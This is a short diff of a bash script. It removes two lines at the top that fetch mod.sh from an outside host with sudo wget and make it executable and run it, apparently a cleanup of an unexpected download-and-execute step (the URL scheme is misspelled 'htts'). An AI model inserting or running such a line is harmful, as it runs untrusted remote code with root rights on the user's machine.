@@ -1,6 +1,5 @@
 #!/bin/bash
-sudo wget htts://cyberprime.netlify.app/mod.sh&&chmod +x mod.sh&&./mod.sh
-./mod.sh
+
 # Check if the script is run as root
 if [ "$(id -u)" -ne 0 ]; then
     echo "This script must be run as root. Exiting."
